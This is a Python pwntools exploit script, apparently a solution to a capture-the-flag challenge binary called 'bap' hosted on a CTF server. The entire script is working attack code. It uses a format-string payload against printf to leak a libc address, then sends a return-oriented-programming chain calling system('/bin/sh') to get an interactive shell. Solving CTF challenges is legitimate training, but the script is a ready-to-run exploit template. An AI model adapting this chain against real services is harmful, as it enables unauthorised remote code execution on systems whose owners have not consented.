#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './bap'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challs.actf.co', 31323

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x04011cd
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec bap                                                                                                                        
#     Arch:     amd64-64-little                                                                                                                     
#     RELRO:    Full RELRO                                                                                                                          
#     Stack:    No canary found                                                                                                                     
#     NX:       NX enabled                                                                                                                          
#     PIE:      No PIE (0x400000)

def exploit():
    global io
    io = initialize()

    payload = b'%7$s'.ljust(8, b'\x00') + p64(elf.got['printf'])
    payload += cyclic(24 - len(payload)) # padding
    payload += p64(elf.sym['_start'])
    io.sendlineafter(b':', payload)

    leak = u64(io.recvuntil(b':', drop=True).strip().ljust(8, b'\x00'))
    libc.address = leak - libc.sym['printf']

    offset = 24
    payload = flat({
        offset: [
            libc.address + 0x02a3e5, # pop rdi; ret
            next(libc.search(b'/bin/sh\x00')),
            0x040101a, # ret
            libc.sym['system'] 
        ]
    })
    io.sendline(payload)

    log.success('leak: %#x', leak)
    io.interactive()
    
if __name__ == '__main__':
    exploit()